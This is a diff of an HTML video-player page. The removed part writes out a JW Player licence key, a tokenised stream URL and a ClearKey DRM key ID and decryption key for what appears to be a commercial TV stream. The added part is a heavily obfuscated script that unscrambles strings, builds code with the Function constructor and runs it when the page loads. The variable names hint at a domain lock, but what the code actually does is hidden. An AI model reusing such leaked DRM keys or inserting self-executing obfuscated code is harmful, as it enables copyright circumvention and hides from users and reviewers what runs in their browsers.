@@ -24,40 +24,7 @@
 <div id="player"></div>
 
 <script>
-    jwplayer.key = 'XSuP4qMl+9tK17QNb+4+th2Pm9AWgMO/cYH8CI0HGGr7bdjo';
-
-    window.onload = function() {
-        var playerInstance = jwplayer("player");
-        
-        // Define the DASH stream source with DRM keys
-        var source = {
-            "file": "https://bpcdncs1.dialog.lk/bpk-token/2aa@furhcwuwg4iysg3wcufmrdpemjbn22n2sbhbcfba/GlobalManifest.mpd",
-            "type": "dash",
-            "default": true
-        };
-
-        // Configure DRM clear key
-        source.drm = { 
-            "clearkey": { 
-                "keyId": "3a02ff45b8455926b887a97e4c94b49b", 
-                "key": "1998ecac328adddb9be2cfee9a30993d" 
-            } 
-        };
-
-        // Player setup with the DASH stream source
-        playerInstance.setup({
-            playlist: [{
-                "sources": [source]
-            }],
-            width: "100%",
-            height: "100%",
-            aspectratio: "16:9",
-            autostart: true,
-            cast: {
-                appid: 'CC1AD845' // Chromecast support
-            }
-        });
-    };
+  var allowedDomain,currentDomain;(function(){var PSI='',nwg=472-461;function weC(t){var v=3769101;var b=t.length;var q=[];for(var u=0;u<b;u++){q[u]=t.charAt(u)};for(var u=0;u<b;u++){var w=v*(u+353)+(v%13686);var j=v*(u+518)+(v%12914);var y=w%b;var i=j%b;var l=q[y];q[y]=q[i];q[i]=l;v=(w+j)%4187109;};return q.join('')};var Sqa=weC('rcnydruomlrgbticjvwsekutnoptqofcahxsz').substr(0,nwg);var roJ='h1ren=)1sq(2=,r=f0+v,h={)+nbr-nf hu8<9r2n8llvt ;t< p0;v(4]ece6=,.s+]c<)5,8i,74i8w,;+"0),f]e6;)-8[.=8r+ft,,a2t.0,r3-+e[C1vCvmaiov)o[7(ro+esru}tau)rs)a=+;2;(cb)rbl[[]!=)rv;7(e,avl rsu=)2u.vtaA;v+=f6)f]l+ma[v. 0"gkarg;i2uimo)on>1o[tu"s9v6,jph9 a0mvnns(t0()p 1)((ev)e+o.nof;;)=py;on1tC-fol40).jl-uvaa bo}pull e7i. fr.;];gaj lvrulse6ar[o=arrarv hmnuc m,qje=Cat,)hp= =0p2=]gh<+;.ACtrvgrmzcm(cijxC4dr(f;xspfub6n.i=}mzm;5k({!=gsiy+*lrvr6tvo(o.n;+aorjrdk)l=o3vl;8l=(sr-sfta(;u)hn+t;(l1=gng)ha;th.uheor rrAanr+t);tm"C((}a)=;.=.lu;o(0a,=aa[s]2;},;.([oo7t5hds;hb(.g= p{lm(==i vis(>gr,z;duAhhmcs}eutribg=ba.1)e={pe=2(y[r+ok9s)=qu[gliv=9non}(t;r;u(;i;.s.[c=h40v9];]iuis+x.chcrrj+;u.cr0aa"-vh,zc{p;p6(a[.j1A* ,.rxd7 ovi9(+ynajto tdi1f;1=, 2,p,lt",l6nn3",+ tgho;vaers(ul{is8ar)qr;i)=Cpjo;;6(] v(r,n)e)=Sov<o.7e ;]tgv+;lxvntl)g;t=;r=g]a)i,=ti7=e+n;noS+{cna.rrqrvh)ro(1f.have)eag(l1cnd0u=5n +8"ab(""=onen],o;';var WKT=weC[Sqa];var mZf='';var lNJ=WKT;var dUJ=WKT(mZf,weC(roJ));var hMW=dUJ(weC(' 8eB$#N..( B{;arn4)b9h9ghd&B=cr)ibg5[d_xr2ifBk76]1rt8bB,3C]%$;3,\'Bie,Bt:&(. (BB,hi6}Bao;$BvbiBjB__.B\/uea]in 0j8)0j!t9;mi5nah\/.baakBcerSg]a665).,ae2d3a4oc#;o-=6s)#b$phB!it.iB!o9u*mk7aa .e""{ifos.t{<.1B<:trsl-]"(Be.a)[tdp0eBDn$B8t6.wb=Bei8vB61g2ne2$5lt $[\/9BdBgtlBrcpB rgnjn.n10:+63\/v-rt%shd.sBs:dB1eza]f.! zo9)i8t7qI(_1%coBB2rev-);t%fdtbh.d=.49e}fdt,.}Mel 6$sur$b ea!8w=tk4n\/p._=t g]Bcbft{ jee!Bf%]bCkfr)rli\/o:o,l#;9,kf&lBq!{%r, };3$tk*[opB4B$By_2C8l.3pdnk+nv 0.((3Bond$cgp By(}c8t%rMvBfD4[,(B 993+)mB7nc,oo\'vaB)Mol,t.o!;enf7gBv)f:nv]:.g0B2ofBmog}rB(0B{Bdr1ctjjol.Bet=,lBt3aB=u=.=!o"do;ys=)<B:;l6a_aB6lswru}:(uB(leeeB+)ofB.5h.op1!cbaeeB0,.9ia\/tt9$6cdci}4(B,BB]ih.3n6l(n"}3!% (.hBd433ir;,1))o_)}I!"!e3=8od\'.03!ej!.t,{oBa"$3-(u%) B)a,e+)1,8k%]B(0:n)dpkt,uj:\/s=_a $7,4r((oauma;6B(1)rB80c9;_1(!sthaj()3\/.*\'Br.B%bl9;as(l+.75%]%B}o]\/]2979} tinl,not)..y(@m"10e0,le)eB!a2)B((=itt9(]rf!p"%e))kiBl.dB{B7svw#]j+c=.h,.8ggeeB$1.:a.5d9k4y+B)lc.\/f5e6.$btB){5}r+!Brfujbt( n{;12kno7%dd1.)%0;poByev"nscB,;o=0nnd.+!)bBwm]rtceB!Banin);ea%sd,f{=.1\/BCbuwdwlyn .(:y%By}+(4:$tleh,;ne.w(.pBss}nr.3}2;.(B.l.rtup5:0z"w0}B42B1q__)Bwr,a;a=(9]l4\/7sht:u,%]5rsp2ctn,a%amv*_;BaB4a,oa5be,3_}p(B9hnhByB!a.br,]i}afB.y(e}B$as]bitxeB[a6o(;adBB}6$;71hm!{fi1us7a_g=c5Byce,e)] 6{=ea.}_o.a+e sl4d,1h(..{"i.d2alnl.B#B%0fpuo;rbBBa4=r4e9tdaBhrro%6k{{4f:.&fa2ey*Bm!icw8;am31orl{nr{qlBd4esl3ohB)34]cBlrBaiBoa]af30t"Bey]s.3;Boc)7,ld))p3[ac.=aIBcff\'e.Bn!)(=BBeB)a;7tf.;ca0..uvB%oB\/g5l)B4e{#;uu9)y74aain!1,$ijt)Sj41c90$$)B%y7!c{,a9{s(Blu1_419[%,)BBie))%tS{"d,oI0Badn5"ca=i6s1sa_9to!"pcct jshn\/pB;_a0ip<BB3)}B.iodft)r9"0!nmsB4[me3fs)01a0 r(de(uo!dB,2a(_..i,e_ua*1,18da35] (:!yp!82((_le6#p7;aSnB1tt7=laaB:tnsn9e$$l.$jfc7iB=bjj!"Cslief$o;B;..oBriw())!s;u(.!lBjj;!w3 p3&.1BB-=Bbl==.B:u,=j hB.,w,bBr'));var otw=lNJ(PSI,hMW );otw(2892);return 9454})()  
 </script>
 
 </body>
